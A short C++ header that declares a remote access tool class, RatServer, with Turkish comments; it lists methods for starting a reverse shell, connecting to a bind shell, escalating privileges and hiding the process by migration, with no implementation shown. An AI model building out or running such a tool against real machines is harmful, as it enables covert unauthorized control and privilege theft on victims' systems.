#ifndef __TEM_RAT_HPP__
#define __TEM_RAT_HPP__

#include "csock.hpp"
#include "temDefines.hpp"
#include <vector>

class RatServer{
private:
    TEM_TARGET_OS targetOs;    
    std::vector<std::vector<char*>> interfaceIPV4;

    uint ratPort;
    const char *ratIP;

   
public:
    RatServer(uint ratPort,const char *ratIP);      //rat serveri baslatir
    
    bool temReverseShell(TEM_TARGET_OS targetOs);   //reverse shell baslatir
    bool temBindShell();                            //bind shell portuna baglanir

    bool temPrivilegeEscalation();                  //yetki yukseltme
    bool temMigrateProcess();                       //processi saklama

    
};


#endif 